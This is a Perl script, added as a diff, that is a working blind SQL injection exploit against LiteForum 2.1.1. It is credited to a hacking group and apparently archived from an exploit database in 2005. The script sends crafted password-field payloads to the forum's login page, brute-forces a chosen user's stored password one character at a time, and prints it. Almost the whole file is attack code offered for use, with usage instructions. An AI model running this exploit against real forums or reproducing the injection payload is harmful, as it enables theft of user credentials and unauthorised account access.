@@ -1,0 +1,123 @@
+#!/usr/bin/perl
+
+use LWP::UserAgent;
+
+## LiteForum 2.1.1 (http://www.softtime.ru) 
+## sql injection exploit
+## work on all mysql versions
+## by 1dt.w0lf
+## RusH security team (http://rst.void.ru)
+## ---------------------------------------
+## greets 2: 
+## ghc (www.ghc.ru)
+## Gh0st Security Team (http://gst.void.ru) heya Ch0ke7 and off couse "re ine" ;)
+## 0xdeadbabe Security Research (0xdeadbabe.blackhatz.info)
+## 10x to cr0n for idea abour kewl haxor "username" =)))
+
+$path   = $ARGV[0];
+$userid = $ARGV[1];
+
+$|++;
+$s_num = 1;
+
+if (@ARGV < 2) { &usage; }
+if ($ARGV[1]=~/[^0-9]/) { print "stupid! \"".$ARGV[1]."\" is not number!"; exit(); }
+print " Please wait...\r\n";
+print " Progress : [";
+
+while(1)
+{
+if(&found(47,58)==0) { &found(96,122); } 
+if ($i=="0") 
+ { 
+ if(length($allchar)>0)
+ {
+ print qq|] 
+
+   USER_ID: $userid
+ USER_PASS: $allchar
+ |;
+ }
+ else
+ {
+ print qq|]
+ Forum not vulnerable or user ID is incorrect|;
+ }
+ 
+ exit(); 
+ 
+ 
+ }
+else 
+ { 
+ print "#"; 
+ $allchar .= chr($i); 
+ }
+$s_num++;
+}
+
+sub found($$)
+ {
+ my $fmin = $_[0];
+ my $fmax = $_[1];
+ if (($fmax-$fmin)<5) { $i=crack($fmin,$fmax); return $i; }
+ 
+ $r = int($fmax - ($fmax-$fmin)/2);
+ $check = " BETWEEN $r AND $fmax";
+ if ( &check($check) ) { &found($r,$fmax); }
+ else { &found($fmin,$r); }
+ }
+ 
+sub crack($$)
+ {
+ my $cmin = $_[0];
+ my $cmax = $_[1];
+ $i = $cmin;
+ while ($i<$cmax)
+  {
+  $crcheck = "=$i";
+  if ( &check($crcheck) ) { return $i; }
+  $i++;
+  }
+ $i = 0;
+ return $i;
+ }
+ 
+sub check($)
+ {
+ $n++;
+ $ccheck = $_[0];
+ 
+ $lite_f = LWP::UserAgent->new() or die;
+ $res = $lite_f->post("$path",
+ [
+ "author" => "i_am_kewl_hakka_FATAL_ERROR_blyat\\",
+ "pswrd"  => " OR (id_author=".$userid." AND (ascii(substring(passw,".$s_num.",1))".$ccheck.")) /*"
+ ] 
+ ); 
+ @results = $res->content; 
+ 
+ foreach $result(@results)
+  {
+  #print $result."\r\n";
+  if ($result =~ /Error/) { return 1; }
+  }
+ return 0;
+ }
+ 
+sub usage {
+ print q|
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ LiteForum 2.1.1 sql injection exploit with one char bruteforce
+           by RusH security team (www.rst.void.ru)
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ Usage: r57lite211.pl [path] [id]                   
+  
+ [path] - path to enter.php (http://host.com/forum/enter.php)
+ [id]   - user ID to bruteforce (1,2,3...)
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ |; 
+ exit();
+}
+
+# milw0rm.com [2005-02-04]
